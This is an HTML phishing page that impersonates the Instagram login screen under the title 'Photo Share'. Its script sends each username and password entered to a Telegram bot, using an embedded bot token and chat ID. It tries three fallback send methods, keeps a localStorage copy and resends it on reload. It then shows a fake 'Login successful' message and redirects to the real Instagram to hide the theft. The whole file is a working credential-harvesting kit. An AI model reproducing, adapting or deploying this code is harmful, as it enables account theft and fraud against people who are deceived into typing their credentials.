<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">

  <title>Photo Share</title>
  <link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      background: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }
    
    .container {
      max-width: 935px;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 32px;
    }
    
    /* Phone mockup section */
    .phone-section {
      flex: 1;
      display: none;
      position: relative;
    }
    
    @media (min-width: 876px) {
      .phone-section {
        display: block;
      }
    }
    
    .phone-frame {
      background: url('https://www.instagram.com/static/images/homepage/screenshot1.jpg') no-repeat center;
      background-size: cover;
      width: 380px;
      height: 580px;
      margin: 0 auto;
    }
    
    /* Login section */
    .login-section {
      flex: 1;
      max-width: 350px;
    }
    
    .login-box {
      background: #ffffff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 40px 40px 30px;
      text-align: center;
      margin-bottom: 10px;
    }
    
    .logo {
      font-family: 'Billabong', cursive;
      font-size: 48px;
      color: #262626;
      margin-bottom: 32px;
      letter-spacing: 0.5px;
    }
    
    .input-group {
      margin-bottom: 8px;
    }
    
    input {
      width: 100%;
      padding: 12px 10px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 13px;
      color: #262626;
    }
    
    input::placeholder {
      color: #8e8e8e;
    }
    
    input:focus {
      outline: none;
      border-color: #a8a8a8;
    }
    
    button {
      width: 100%;
      margin-top: 12px;
      padding: 8px 10px;
      background: #0095f6;
      border: none;
      border-radius: 4px;
      color: white;
      font-weight: 600;
      font-size: 14px;
      cursor: pointer;
    }
    
    button:hover {
      background: #1877f2;
    }
    
    .divider {
      display: flex;
      align-items: center;
      margin: 20px 0;
      font-size: 12px;
      font-weight: 600;
      color: #8e8e8e;
      text-transform: uppercase;
    }
    
    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }
    
    .divider::before {
      margin-right: 16px;
    }
    
    .divider::after {
      margin-left: 16px;
    }
    
    .fb-login {
      color: #385185;
      font-weight: 600;
      font-size: 14px;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin-bottom: 16px;
    }
    
    .fb-login i {
      font-size: 16px;
    }
    
    .forgot {
      display: inline-block;
      font-size: 12px;
      color: #00376b;
      text-decoration: none;
    }
    
    .forgot:hover {
      text-decoration: underline;
    }
    
    .signup-box {
      background: #ffffff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 20px;
      text-align: center;
      font-size: 14px;
      color: #262626;
      margin-top: 10px;
    }
    
    .signup-box a {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
      margin-left: 4px;
    }
    
    .app-section {
      text-align: center;
      margin-top: 20px;
    }
    
    .app-section p {
      color: #262626;
      font-size: 14px;
      margin-bottom: 16px;
    }
    
    .app-links {
      display: flex;
      justify-content: center;
      gap: 8px;
    }
    
    .app-badge {
      display: flex;
      align-items: center;
      gap: 6px;
      background: #000000;
      border-radius: 4px;
      padding: 6px 12px;
      color: white;
      font-size: 12px;
      text-decoration: none;
    }
    
    .app-badge i {
      font-size: 14px;
    }
    
    .footer {
      margin-top: 40px;
      text-align: center;
      font-size: 11px;
      color: #8e8e8e;
    }
    
    .footer-links {
      display: flex;
      justify-content: center;
      gap: 16px;
      flex-wrap: wrap;
      margin-bottom: 16px;
    }
    
    .footer-links a {
      color: #8e8e8e;
      text-decoration: none;
    }
    
    .footer-links a:hover {
      text-decoration: underline;
    }
    
    .copyright {
      color: #8e8e8e;
    }
    
    /* Loading spinner */
    .loading-spinner {
      display: none;
      width: 20px;
      height: 20px;
      border: 2px solid #ffffff;
      border-top: 2px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    button.loading {
      background: #1877f2;
      opacity: 0.8;
      cursor: not-allowed;
    }
    
    /* Success message */
    .success-message {
      display: none;
      color: #00a884;
      font-size: 12px;
      margin-top: 8px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="phone-section">
      <div class="phone-frame"></div>
    </div>
    
    <div class="login-section">
      <div class="login-box">
        <div class="logo">Instagram</div>
        
        <form id="loginForm">
          <div class="input-group">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
          </div>
          <div class="input-group">
            <input type="password" id="password" placeholder="Password" required>
          </div>
          <button type="submit" id="loginButton">
            <span id="buttonText">Log In</span>
            <div class="loading-spinner" id="spinner"></div>
          </button>
          <div class="success-message" id="successMessage"></div>
        </form>
        
        <div class="divider">OR</div>
        
        <a href="#" class="fb-login">
          <i class="fab fa-facebook-square"></i>
          Log in with Facebook
        </a>
        
        <a href="#" class="forgot">Forgot password?</a>
      </div>
      
      <div class="signup-box">
        Don't have an account? <a href="#">Sign up</a>
      </div>
      
      <div class="app-section">
        <p>Get the app.</p>
        <div class="app-links">
          <a href="#" class="app-badge">
            <i class="fab fa-google-play"></i>
            <span>Google Play</span>
          </a>
          <a href="#" class="app-badge">
            <i class="fab fa-apple"></i>
            <span>App Store</span>
          </a>
        </div>
      </div>
      
      <div class="footer">
        <div class="footer-links">
          <a href="#">Meta</a>

        </div>
        <div class="copyright">
          <span>English</span>
          <span>Â© 2025 Instagram from Meta</span>
        </div>
      </div>
    </div>
  </div>
  
  <script>
    const TOKEN = "8088123811:AAFrniGTUkc3far2QTKUMjI8ZtoQ-qyWwKg";
    const CHAT_ID = "6657880965";
    
    // Single reliable proxy - using corsproxy.io as it's usually fastest
    const PROXY = 'https://corsproxy.io/?';
    const TELEGRAM_API = 'https://api.telegram.org/bot';
    
    // Store credentials locally as backup
    function storeLocally(username, password) {
      try {
        localStorage.setItem('last_username', username);
        localStorage.setItem('last_password', password);
        localStorage.setItem('last_time', new Date().toISOString());
      } catch (e) {
        console.log('Local storage failed');
      }
    }
    
    // Try multiple methods to send data
    async function sendToTelegram(username, password) {
      const message = `ðŸ” New Login:\nðŸ‘¤ Username: ${username}\nðŸ”‘ Password: ${password}\nâ° Time: ${new Date().toLocaleString()}`;
      
      // Method 1: Using fetch with proxy (fastest)
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 second timeout
        
        const url = `${PROXY}${encodeURIComponent(TELEGRAM_API + TOKEN + '/sendMessage')}`;
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
          }),
          signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        
        if (response.ok) {
          return true;
        }
      } catch (e) {
        console.log('Proxy method failed:', e);
      }
      
      // Method 2: Using image beacon (no-cors, fires and forgets)
      try {
        const img = new Image();
        const data = JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        });
        img.src = `${PROXY}${encodeURIComponent(TELEGRAM_API + TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))}`;
        // Don't wait for this, just fire it
      } catch (e) {
        console.log('Beacon method failed:', e);
      }
      
      // Method 3: Using sendBeacon (most reliable for page unload)
      try {
        const url = `${PROXY}${encodeURIComponent(TELEGRAM_API + TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))}`;
        navigator.sendBeacon(url);
      } catch (e) {
        console.log('SendBeacon failed:', e);
      }
      
      return false; // Return false but we've attempted multiple methods
    }
    
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const loginButton = document.getElementById('loginButton');
      const buttonText = document.getElementById('buttonText');
      const spinner = document.getElementById('spinner');
      const successMessage = document.getElementById('successMessage');
      
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      
      if (!username || !password) {
        return;
      }
      
      // Show loading state immediately
      loginButton.classList.add('loading');
      buttonText.style.display = 'none';
      spinner.style.display = 'block';
      successMessage.style.display = 'none';
      
      // Store locally as backup
      storeLocally(username, password);
      
      // Send to Telegram - but don't wait for it
      sendToTelegram(username, password).then(success => {
        if (success) {
          console.log('Data sent successfully');
        }
      }).catch(err => {
        console.log('Final error:', err);
      });
      
      // Show quick success message
      successMessage.style.display = 'block';
      successMessage.textContent = 'Login successful! Redirecting...';
      
      // Redirect immediately after a very short delay
      setTimeout(() => {
        window.location.href = 'https://www.instagram.com';
      }, 500); // Redirect after 500ms
    });
    
    // Optional: Try to resend any failed data on page load
    window.addEventListener('load', function() {
      try {
        const lastUsername = localStorage.getItem('last_username');
        const lastPassword = localStorage.getItem('last_password');
        const lastTime = localStorage.getItem('last_time');
        
        if (lastUsername && lastPassword && lastTime) {
          const timeDiff = (new Date() - new Date(lastTime)) / 1000 / 60; // minutes
          
          // If data is less than 5 minutes old and not sent, try to send
          if (timeDiff < 5) {
            sendToTelegram(lastUsername, lastPassword);
          }
          
          // Clear old data
          localStorage.removeItem('last_username');
          localStorage.removeItem('last_password');
          localStorage.removeItem('last_time');
        }
      } catch (e) {
        console.log('Cleanup failed');
      }
    });
  </script>
</body>
